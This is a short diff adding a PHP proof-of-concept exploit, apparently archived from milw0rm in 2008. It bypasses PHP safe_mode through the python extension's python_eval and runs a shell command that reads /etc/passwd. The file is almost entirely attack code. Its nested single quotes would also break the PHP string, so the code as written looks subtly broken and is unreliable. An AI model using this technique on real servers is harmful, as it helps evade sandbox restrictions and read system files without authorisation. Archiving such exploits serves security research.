@@ -1,0 +1,23 @@
+<?php
+/*
+  php_python_bypass.php
+  php python extension safe_mode bypass
+  Amir Salmani - amir[at]salmani[dot]ir
+*/
+
+//python ext. installed?
+if (!extension_loaded('python')) die("python extension is not installed\n");
+
+//eval python code
+$res = python_eval('
+import os
+pwd = os.getcwd()
+print pwd
+os.system('cat /etc/passwd')
+');
+
+//show result
+echo $res;
+?>
+
+# milw0rm.com [2008-12-17]
